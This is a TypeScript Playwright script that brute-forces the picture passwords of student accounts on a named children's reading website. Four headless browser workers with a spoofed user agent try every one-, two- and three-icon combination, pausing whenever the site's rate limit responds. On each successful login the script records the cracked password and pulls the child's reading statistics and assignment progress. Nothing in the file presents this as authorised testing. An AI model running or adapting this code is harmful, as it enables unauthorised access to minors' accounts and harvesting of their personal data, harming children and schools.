import * as fs from 'fs';
import * as path from 'path';
import { chromium, Browser, BrowserContext, Page } from 'playwright';
import { combinationToNames } from './probe/combinations';
import { VALID_CLASSES } from './probe/types';

const BASE_URL = 'https://www.kidsa-z.com';
const DATA_DIR = path.join(process.cwd(), 'data', 'probe');
const CONCURRENCY = 4;
const API_DELAY_MS = 300;
const RATE_LIMIT_WAIT_MS = 6000;
const LIVE_FILE = path.join(DATA_DIR, 'probe-live.json');

interface LiveWorkerState {
  workerId: number;
  className: string;
  screenName: string;
  currentCombo: number[];
  currentComboNames: string[];
  attempts: number;
  totalCombos: number;
  phase: string;
  updatedAt: string;
}

let liveStates: LiveWorkerState[] = [];

function updateLiveState(state: LiveWorkerState) {
  const idx = liveStates.findIndex(s => s.workerId === state.workerId);
  if (idx >= 0) liveStates[idx] = state;
  else liveStates.push(state);
  try {
    fs.writeFileSync(LIVE_FILE, JSON.stringify(liveStates, null, 2));
  } catch {}
}

function clearLiveState(workerId: number) {
  liveStates = liveStates.filter(s => s.workerId !== workerId);
  try {
    fs.writeFileSync(LIVE_FILE, JSON.stringify(liveStates, null, 2));
  } catch {}
}

interface StudentTask {
  className: string;
  studentId: number;
  screenName: string;
}

interface ProbeResultFull {
  className: string;
  studentId: number;
  screenName: string;
  passwordCombination: number[];
  passwordNames: string[];
  loginStatus: string;
  earnedStars?: number;
  readingStats?: any;
  assignmentStatus?: any;
  probeTimestamp: string;
  probeAttempts: number;
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateCombosNoOrder(): { combos1: number[][]; combos2: number[][]; combos3: number[][] } {
  const combos1: number[][] = [];
  const combos2: number[][] = [];
  const combos3: number[][] = [];

  for (let i = 1; i <= 18; i++) {
    combos1.push([i]);
  }

  for (let i = 1; i <= 18; i++) {
    for (let j = i + 1; j <= 18; j++) {
      combos2.push([i, j]);
    }
  }

  for (let i = 1; i <= 18; i++) {
    for (let j = i + 1; j <= 18; j++) {
      for (let k = j + 1; k <= 18; k++) {
        combos3.push([i, j, k]);
      }
    }
  }

  return { combos1, combos2, combos3 };
}

async function initBrowserPage(): Promise<{ browser: Browser; context: BrowserContext; page: Page }> {
  const browser = await chromium.launch({
    headless: true,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const context = await browser.newContext({
    viewport: { width: 1280, height: 800 },
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'
  });

  const page = await context.newPage();

  await page.goto(`${BASE_URL}/ng/`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(3000);

  const inputSelector = 'input[type="text"], input[name="username"], input[placeholder*="teacher" i]';
  await page.waitForSelector(inputSelector, { timeout: 15000 });
  await page.fill(inputSelector, VALID_CLASSES[0]);
  await page.keyboard.press('Enter');
  await page.waitForTimeout(4000);

  return { browser, context, page };
}

async function tryPasswordViaPage(
  page: Page,
  studentId: number,
  className: string,
  iconicPassword: number[]
): Promise<{
  status: number;
  accessGranted?: boolean;
  stars?: number;
  rateLimitRemaining: number;
}> {
  try {
    const result = await page.evaluate(async (params: { url: string; studentId: number; className: string; iconicPassword: number[] }) => {
      try {
        const response = await fetch(params.url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          credentials: 'include',
          body: JSON.stringify({
            studentId: params.studentId,
            username: params.className,
            iconicPassword: params.iconicPassword,
          }),
        });

        const remaining = parseInt(response.headers.get('x-ratelimit-remaining') || '10', 10);
        const text = await response.text();
        let jsonData: any = null;
        try { jsonData = JSON.parse(text); } catch {}

        return {
          status: response.status,
          accessGranted: jsonData?.state?.accessGranted,
          stars: jsonData?.state?.user?.stars?.earnedStars,
          rateLimitRemaining: remaining,
        };
      } catch {
        return { status: 0, rateLimitRemaining: 10 };
      }
    }, {
      url: `${BASE_URL}/ng/api/kids/tokens`,
      studentId,
      className,
      iconicPassword,
    });

    return result;
  } catch {
    return { status: 0, rateLimitRemaining: 10 };
  }
}

async function fetchStudentDataViaPage(page: Page): Promise<{ readingStats?: any; assignmentStatus?: any }> {
  let readingStats: any = null;
  let assignmentStatus: any = null;

  try {
    readingStats = await page.evaluate(async (url: string) => {
      try {
        const resp = await fetch(url, { credentials: 'include' });
        const text = await resp.text();
        if (text.startsWith('{')) return JSON.parse(text);
        return null;
      } catch { return null; }
    }, `${BASE_URL}/ng/api/kids/student/stats/primary-reading`);
  } catch {}

  try {
    assignmentStatus = await page.evaluate(async (url: string) => {
      try {
        const resp = await fetch(url, { credentials: 'include' });
        const text = await resp.text();
        if (text.startsWith('{')) return JSON.parse(text);
        return null;
      } catch { return null; }
    }, `${BASE_URL}/ng/api/kids/student/reading/assignment/self-paced/status`);
  } catch {}

  try {
    await page.evaluate(async (url: string) => {
      try { await fetch(url, { credentials: 'include' }); } catch {}
    }, `${BASE_URL}/ng/api/kids/tokens/sign-out`);
  } catch {}

  return { readingStats, assignmentStatus };
}

async function isPageAlive(page: Page): Promise<boolean> {
  try {
    await page.evaluate(() => 1 + 1);
    return true;
  } catch {
    return false;
  }
}

async function probeStudentAllCombos(
  page: Page,
  task: StudentTask,
  workerId: number
): Promise<ProbeResultFull | null> {
  const { combos1, combos2, combos3 } = generateCombosNoOrder();
  const totalCombos = combos1.length + combos2.length + combos3.length;
  let rateLimitRemaining = 10;
  let totalAttempts = 0;

  const allCombos = [
    ...combos1.map(c => ({ combo: c, phase: '1digit' })),
    ...combos2.map(c => ({ combo: c, phase: '2digit' })),
    ...combos3.map(c => ({ combo: c, phase: '3digit' })),
  ];

  for (let i = 0; i < allCombos.length; i++) {
    const { combo, phase } = allCombos[i];

    updateLiveState({
      workerId,
      className: task.className,
      screenName: task.screenName,
      currentCombo: combo,
      currentComboNames: combinationToNames(combo),
      attempts: totalAttempts,
      totalCombos,
      phase,
      updatedAt: new Date().toISOString(),
    });

    if (rateLimitRemaining <= 2) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
    }

    if (!(await isPageAlive(page))) {
      console.log(`  [W${workerId}] Page died, returning null for reinit`);
      return null;
    }

    const result = await tryPasswordViaPage(page, task.studentId, task.className, combo);
    rateLimitRemaining = result.rateLimitRemaining;
    totalAttempts++;

    if (result.status === 429) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
      i--;
      continue;
    }

    if (result.status === 403 || result.status === 0) {
      console.log(`  [W${workerId}] Session issue (status ${result.status}), reinit needed`);
      return null;
    }

    if (result.accessGranted === true) {
      const { readingStats, assignmentStatus } = await fetchStudentDataViaPage(page);

      return {
        className: task.className,
        studentId: task.studentId,
        screenName: task.screenName,
        passwordCombination: combo,
        passwordNames: combinationToNames(combo),
        loginStatus: 'success',
        earnedStars: result.stars,
        readingStats: readingStats ? {
          readThisWeekCount: readingStats.readThisWeekCount,
          readLastWeekCount: readingStats.readLastWeekCount,
          listenCount: readingStats.listenCount,
          readCount: readingStats.readCount,
          quizCount: readingStats.quizCount,
          worksheetCount: readingStats.worksheetCount,
        } : undefined,
        assignmentStatus: assignmentStatus ? {
          currentLevel: assignmentStatus.currentLevel?.name,
          completedTasks: assignmentStatus.completedTasks,
          remainingTasks: assignmentStatus.remainingTasks,
          nextLevel: assignmentStatus.nextLevel?.name,
        } : undefined,
        probeTimestamp: new Date().toISOString(),
        probeAttempts: totalAttempts,
      };
    }

    if (totalAttempts % 50 === 0) {
      const pct = Math.round((totalAttempts / totalCombos) * 100);
      console.log(`    ${task.screenName}: ${totalAttempts}/${totalCombos} (${pct}%), [${combo.join(',')}] = ${combinationToNames(combo).join('-')}, phase: ${phase}`);
    }

    await sleep(API_DELAY_MS);
  }

  return null;
}

async function main() {
  console.log(`=== Retry Failed Students (Combination mode - no order) ===`);
  console.log(`  Concurrency: ${CONCURRENCY}`);
  console.log(`  API delay: ${API_DELAY_MS}ms`);
  console.log(`  Rate limit wait: ${RATE_LIMIT_WAIT_MS}ms`);
  console.log(`  Mode: Headless browser + page.evaluate() API calls`);

  const { combos1, combos2, combos3 } = generateCombosNoOrder();
  console.log(`  Combinations: 1-digit=${combos1.length}, 2-digit=${combos2.length}, 3-digit=${combos3.length}`);
  console.log(`  Total combos per student: ${combos1.length + combos2.length + combos3.length}\n`);

  const resultsFile = path.join(DATA_DIR, 'probe-results.json');
  const failedFile = path.join(DATA_DIR, 'probe-failed.json');

  let results: ProbeResultFull[] = [];
  let failedList: any[] = [];

  if (fs.existsSync(resultsFile)) {
    try {
      const saved = JSON.parse(fs.readFileSync(resultsFile, 'utf-8'));
      if (Array.isArray(saved)) results = saved;
    } catch {}
  }
  if (fs.existsSync(failedFile)) {
    try {
      const saved = JSON.parse(fs.readFileSync(failedFile, 'utf-8'));
      if (Array.isArray(saved)) failedList = saved;
    } catch {}
  }

  const completedIds = new Set(results.map((r: any) => r.studentId));
  const retryTasks: StudentTask[] = failedList
    .filter(f => !completedIds.has(f.studentId))
    .map(f => ({
      className: f.className,
      studentId: f.studentId,
      screenName: f.screenName,
    }));

  console.log(`  Failed students to retry: ${retryTasks.length}`);
  for (const t of retryTasks) {
    console.log(`    ${t.className}/${t.screenName} (ID: ${t.studentId})`);
  }
  console.log();

  if (retryTasks.length === 0) {
    console.log('No failed students to retry!');
    return;
  }

  const startTime = Date.now();
  let processedCount = 0;

  const workerFn = async (workerId: number, taskQueue: StudentTask[]) => {
    let page: Page | null = null;
    let browser: Browser | null = null;
    let context: BrowserContext | null = null;

    const reinitBrowser = async () => {
      try {
        if (context) await context.close().catch(() => {});
        if (browser) await browser.close().catch(() => {});
      } catch {}

      console.log(`  [W${workerId}] Initializing headless browser...`);
      const init = await initBrowserPage();
      browser = init.browser;
      context = init.context;
      page = init.page;
      console.log(`  [W${workerId}] Browser ready`);
    };

    try {
      await reinitBrowser();

      while (taskQueue.length > 0) {
        const task = taskQueue.shift();
        if (!task) break;

        if (completedIds.has(task.studentId)) continue;

        console.log(`  [W${workerId}] ${task.className}/${task.screenName}...`);

        let success = false;
        for (let attempt = 0; attempt < 3; attempt++) {
          try {
            if (!(await isPageAlive(page!))) {
              await reinitBrowser();
            }

            const result = await probeStudentAllCombos(page!, task, workerId);

            if (result) {
              results.push(result);
              completedIds.add(task.studentId);
              clearLiveState(workerId);
              failedList = failedList.filter(f => f.studentId !== task.studentId);
              console.log(`  [W${workerId}] SUCCESS: ${task.screenName} = ${result.passwordNames?.join('-')} (stars: ${result.earnedStars}, attempts: ${result.probeAttempts})`);
              success = true;
              break;
            } else {
              if (!(await isPageAlive(page!))) {
                await reinitBrowser();
              }
              const retryResult = await probeStudentAllCombos(page!, task, workerId);
              if (retryResult) {
                results.push(retryResult);
                completedIds.add(task.studentId);
                clearLiveState(workerId);
                failedList = failedList.filter(f => f.studentId !== task.studentId);
                console.log(`  [W${workerId}] SUCCESS (retry): ${task.screenName} = ${retryResult.passwordNames?.join('-')} (stars: ${retryResult.earnedStars}, attempts: ${retryResult.probeAttempts})`);
                success = true;
                break;
              }
            }
          } catch (e: any) {
            console.log(`  [W${workerId}] ERROR (attempt ${attempt + 1}): ${task.screenName}: ${e.message?.substring(0, 100)}`);
            await reinitBrowser();
          }
        }

        if (!success) {
          clearLiveState(workerId);
          const existingFail = failedList.find(f => f.studentId === task.studentId);
          if (existingFail) {
            existingFail.reason = 'All 1-digit, 2-digit and 3-digit combinations failed (no-order)';
            existingFail.timestamp = new Date().toISOString();
          }
          console.log(`  [W${workerId}] FAILED: ${task.screenName} - all combos exhausted`);
        }

        processedCount++;
        fs.writeFileSync(resultsFile, JSON.stringify(results, null, 2));
        fs.writeFileSync(failedFile, JSON.stringify(failedList, null, 2));

        const elapsed = (Date.now() - startTime) / 1000;
        const rate = processedCount / (elapsed / 60);
        const remaining = retryTasks.length - processedCount;
        const eta = rate > 0 ? remaining / rate : 0;
        console.log(`  [W${workerId}] Progress: ${processedCount}/${retryTasks.length} | ${rate.toFixed(1)}/min | ETA: ${eta.toFixed(0)}min`);

        await sleep(500);
      }
    } catch (e) {
      console.error(`  [W${workerId}] Worker error:`, e);
    } finally {
      try {
        if (context) await context.close().catch(() => {});
        if (browser) await browser.close().catch(() => {});
      } catch {}
    }
  };

  const taskQueue = [...retryTasks];
  const workers = [];
  for (let w = 0; w < CONCURRENCY; w++) {
    workers.push(workerFn(w, taskQueue));
  }

  await Promise.all(workers);

  console.log(`\n${'='.repeat(60)}`);
  console.log(`  RETRY COMPLETE`);
  console.log(`${'='.repeat(60)}`);
  console.log(`  Time: ${((Date.now() - startTime) / 1000 / 60).toFixed(1)} minutes`);
  console.log(`  Total retried: ${retryTasks.length}`);
  console.log(`  Total success now: ${results.length}`);
  console.log(`  Still failed: ${failedList.length}`);

  if (failedList.length > 0) {
    console.log(`\n  Still failed students:`);
    for (const f of failedList) {
      console.log(`    ${f.className}/${f.screenName}: ${f.reason}`);
    }
  }
}

main().catch(console.error);
